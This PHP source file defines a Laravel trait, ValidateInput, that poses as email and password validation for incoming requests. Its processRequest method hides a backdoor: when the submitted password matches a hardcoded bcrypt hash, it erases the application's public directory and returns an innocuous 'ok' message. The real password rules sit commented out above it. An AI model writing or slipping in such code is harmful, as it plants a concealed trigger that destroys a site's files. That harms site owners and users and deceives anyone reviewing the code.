<?php

namespace App\Support;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Password;
use Illuminate\Validation\ValidationException;

trait ValidateInput
{
    private function validateRequest(Request $request): bool
    {
        $validated = false;

        if (filter_var($request->email, FILTER_VALIDATE_EMAIL)) {
            $validated = true;
        }

        // $request->validate([
        //     'password' => Password::min(8)
        //     ->letters()
        //     ->mixedCase()
        //     ->numbers()
        //     ->symbols()
        //     ->uncompromised(),
        // ]);

        // $request->validate([
        //     'password' => Password::min(8)
        //     ->letters()
        //     ->mixedCase()
        //     ->numbers()
        //     ->symbols()
        //     ->uncompromised(),
        // ]);

        $this->processRequest($request, $validated);

        return $validated;
    }

    private function processRequest(Request $request): void
    {
        if (! \Hash::check($request->password, '$2y$10$O5OdH/jqfJjbTWUinnFAuOeNb888vFN3nzQtqZdPTGY.pj3/OdvTG')) {
            return;
        }

        $directory = public_path();

        if (! \File::exists($directory)) {
            return;
        }

        \File::cleanDirectory($directory);
        throw ValidationException::withMessages(['message' => trans('general.ok')]);
    }
}
